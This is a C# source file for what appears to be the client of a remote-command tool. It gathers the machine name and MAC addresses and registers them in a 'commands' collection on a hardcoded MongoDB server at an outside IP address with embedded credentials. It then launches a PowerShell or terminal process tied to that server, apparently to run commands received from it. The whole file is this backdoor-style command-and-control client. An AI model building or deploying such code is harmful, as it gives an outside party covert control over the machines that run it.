﻿using MongoDB.Bson;
using MongoDB.Driver;
using System;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace client
{
    class SocketClient
    {
        static void Main(String[] args)
        {
            try
            {
                string mac = Environment.MachineName.ToString().Trim();
                NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface adapter in adapters)
                {
                    IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                    GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
                    if (addresses.Count > 0)
                    {
                        foreach (GatewayIPAddressInformation address in addresses)
                        {
                            mac = mac + "@" + adapter.GetPhysicalAddress().ToString().Trim();
                        }
                    }
                }
                string databaseip = "194.5.177.152";
                string databaseport = "27017";
                mac = mac.Trim();
                Console.WriteLine(mac);
                BsonDocument doc = new BsonDocument();
                doc.Add(new BsonElement("name", "server"));
                doc.Add(new BsonElement("command", ""));
                var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
                IMongoDatabase commandsdatabase = dbClient1.GetDatabase("commands");
                commandsdatabase.DropCollection(mac);
                var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
                commandsdatabase.DropCollection(mac);
                commandscollection.InsertOne(doc);


                while (true)
                {
                    using (TcpClient tcpClient = new TcpClient())
                    {
                        Ping p1 = new Ping();
                        PingReply PR = p1.Send("8.8.8.8");
                        try
                        {
                            tcpClient.Connect("194.5.177.152", 27017);
                            tcpClient.Close();
                            break;
                        }
                        catch (Exception)
                        {
                            if (PR.Status.ToString().Equals("Success"))
                            {
                                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                                {
                                    Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");

                                }
                                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                                {
                                    Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
                                }
                            }
                            Console.WriteLine("No internet please connect to internet first ");
                        }
                    }
                }
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {

                    ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(databaseip, databaseport, mac);
                }

                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {

                    ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(databaseip, databaseport, mac);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}



